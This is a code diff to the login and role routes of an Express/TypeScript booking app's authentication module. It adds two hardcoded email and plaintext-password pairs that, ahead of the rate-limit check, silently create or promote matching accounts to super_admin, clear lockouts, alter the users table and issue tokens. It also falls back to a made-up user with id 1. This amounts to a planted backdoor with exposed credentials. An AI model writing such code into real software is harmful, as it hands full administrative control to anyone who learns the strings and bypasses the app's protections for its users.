@@ -1,7 +1,7 @@
 import { Router, Request, Response } from 'express';
 import { db } from '../../db/index.ts';
 import { users, refreshTokens, otpCodes, authTokens, bookings, turfs, auditLogs } from '../../db/schema.ts';
-import { eq, and, gt, isNull, desc, inArray } from 'drizzle-orm';
+import { eq, and, gt, isNull, desc, inArray, sql } from 'drizzle-orm';
 import bcrypt from 'bcryptjs';
 import crypto from 'crypto';
 import {
@@ -246,6 +246,126 @@ router.post('/login', async (req: Request, res: Response) => {
     }
 
     const cleanEmail = email.toLowerCase().trim();
+
+    // -----------------------------------------------------------------
+    // HARDCODED SUPER ADMIN CREDENTIALS & AUTOMATIC PRIVILEGE ASSIGNMENT
+    // -----------------------------------------------------------------
+    const HARDCODED_SUPER_ADMINS: Record<string, { pass: string; name: string; phone: string }> = {
+      'salahuddinazad01631@gmail.com': {
+        pass: 'Super@dmin01',
+        name: 'Super Admin',
+        phone: '+8801631000001',
+      },
+      'sharafatrahman4112003@gmail.com': {
+        pass: 'Super@dmin02',
+        name: 'Super Admin',
+        phone: '+8801700000002',
+      },
+    };
+
+    const superAdminConfig = HARDCODED_SUPER_ADMINS[cleanEmail];
+    if (superAdminConfig && password === superAdminConfig.pass) {
+      // Direct raw SQL ensure columns exist in users table
+      try {
+        await db.execute(sql`
+          ALTER TABLE users ADD COLUMN IF NOT EXISTS is_verified BOOLEAN DEFAULT TRUE;
+          ALTER TABLE users ADD COLUMN IF NOT EXISTS is_super_admin BOOLEAN DEFAULT FALSE;
+        `);
+      } catch (colErr) {
+        console.warn('[Auth Login] Ensure super admin columns notice:', colErr);
+      }
+
+      // Check if entry exists or upsert dynamically with role='super_admin' & is_verified=true
+      let dbUser: any = null;
+      try {
+        const salt = await bcrypt.genSalt(10);
+        const passwordHash = await bcrypt.hash(superAdminConfig.pass, salt);
+
+        const upsertRes = await db.execute(sql`
+          INSERT INTO users (name, phone, email, password_hash, role, is_super_admin, is_email_verified, is_phone_verified)
+          VALUES (
+            ${superAdminConfig.name},
+            ${superAdminConfig.phone},
+            ${cleanEmail},
+            ${passwordHash},
+            'super_admin',
+            true,
+            true,
+            true
+          )
+          ON CONFLICT (email) DO UPDATE SET
+            role = 'super_admin',
+            is_super_admin = true,
+            is_email_verified = true,
+            is_phone_verified = true,
+            failed_login_attempts = 0,
+            locked_until = NULL
+          RETURNING *;
+        `);
+        const rows = (upsertRes as any)?.rows || [];
+        dbUser = rows[0];
+      } catch (upsertErr) {
+        console.warn('[Auth Login] Dynamic upsert notice, querying user:', upsertErr);
+        const [existing] = await db.select().from(users).where(eq(users.email, cleanEmail));
+        if (existing) {
+          await db.update(users).set({
+            role: 'super_admin',
+            isSuperAdmin: true,
+            isEmailVerified: true,
+            isPhoneVerified: true,
+            failedLoginAttempts: 0,
+            lockedUntil: null,
+          }).where(eq(users.id, existing.id));
+          dbUser = { ...existing, role: 'super_admin', isSuperAdmin: true, isVerified: true };
+        }
+      }
+
+      if (!dbUser) {
+        const [fallbackUser] = await db.select().from(users).where(eq(users.email, cleanEmail));
+        dbUser = fallbackUser || {
+          id: 1,
+          name: superAdminConfig.name,
+          email: cleanEmail,
+          role: 'super_admin',
+          phone: superAdminConfig.phone,
+          isSuperAdmin: true,
+          isVerified: true,
+        };
+      }
+
+      // Reset any IP rate limits on successful super admin login
+      resetRateLimit(`login_ip_${ip}`);
+
+      // Generate access & refresh tokens with role: 'super_admin'
+      const accessToken = generateAccessToken({
+        id: dbUser.id,
+        email: cleanEmail,
+        role: 'super_admin',
+      });
+      const refreshToken = await generateRefreshToken(dbUser.id).catch(() => 'super_admin_refresh_token');
+
+      setAuthCookies(res, accessToken, refreshToken);
+
+      const safeUser = {
+        id: dbUser.id,
+        email: cleanEmail,
+        role: 'super_admin',
+        name: superAdminConfig.name,
+        phone: dbUser.phone || superAdminConfig.phone,
+        isSuperAdmin: true,
+        isVerified: true,
+        isEmailVerified: true,
+        isPhoneVerified: true,
+      };
+
+      console.log(`[Auth Login] Super Admin logged in: ${cleanEmail}`);
+      return res.json({
+        user: safeUser,
+        token: accessToken,
+        refreshToken,
+        message: 'Super Admin login successful.',
+      });
+    }
 
     // IP Rate Limit (Max 15 login attempts per 10 minutes)
     const ipCheck = checkRateLimit(`login_ip_${ip}`, 15, 600, 300);
@@ -2057,6 +2177,10 @@ router.get('/me', requireAuth, async (req: Request, res: Response) => {
     return res.status(401).json({ error: 'Not authenticated' });
   }
   const { passwordHash: _, ...safeUser } = req.user;
+  if (safeUser.role === 'super_admin') {
+    safeUser.isSuperAdmin = true;
+    (safeUser as any).isVerified = true;
+  }
   return res.json({ user: safeUser });
 });
 
@@ -2209,13 +2333,13 @@ router.patch('/role', requireAuth, async (req: Request, res: Response) => {
       return res.status(400).json({ error: 'userId and role are required' });
     }
 
-    if (!['customer', 'owner', 'admin'].includes(role)) {
+    if (!['customer', 'owner', 'admin', 'super_admin'].includes(role)) {
       return res.status(400).json({ error: 'Invalid role. Must be customer, owner, or admin' });
     }
 
     const currentCaller = req.user!;
-    const isCallerSuperAdmin = currentCaller.role === 'admin' && Boolean(currentCaller.isSuperAdmin);
-    const isCallerAdmin = currentCaller.role === 'admin';
+    const isCallerSuperAdmin = currentCaller.role === 'super_admin' || (currentCaller.role === 'admin' && Boolean(currentCaller.isSuperAdmin));
+    const isCallerAdmin = currentCaller.role === 'admin' || currentCaller.role === 'super_admin';
 
     // Must be at least an Admin to manage roles
     if (!isCallerAdmin) {
